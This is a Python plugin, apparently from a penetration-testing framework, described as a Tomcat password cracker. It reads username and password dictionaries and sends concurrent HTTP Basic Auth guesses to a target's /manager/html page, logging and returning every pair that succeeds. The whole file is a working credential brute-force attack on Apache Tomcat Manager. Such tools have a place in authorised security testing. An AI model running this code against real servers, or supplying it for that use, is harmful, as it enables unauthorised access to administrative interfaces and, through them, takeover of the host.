# -*-* coding:UTF-8
import base64
import os
from urllib import parse


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "description": "tomcat口令破解",
        "datetime": "2021-12-31"
    }

    def url(self) -> dict:
        with self.async_pool(max_workers=self.target.setting.asyncio, threshold=self.threshold) as execute:
            for username, password in self.build_login_dict(
                    method=self.target.args.method,
                    username=self.target.args.username or os.path.join('data', 'tomcat_username'),
                    password=self.target.args.password or os.path.join('data', 'tomcat_password'),
            ):
                execute.submit(self.task, username, password)
            return {'LoginInfo': execute.result()}

    async def task(self, username, password):
        self.log.debug(f'Login => username: {username}, password: {password}')
        r = await self.async_http(
            method='get',
            url=parse.urljoin(self.target.value, './manager/html'),
            headers={
                'Authorization': "Basic " + base64.b64encode(f'{username}:{password}'.encode("utf-8")).decode("utf-8")
            }
        )
        if r.status_code == 200:
            self.log.info(f'Login => username: {username}, password: {password} [success]')
            return {
                'port': 0,
                'server': 'tomcat',
                'username': username,
                'password': password
            }
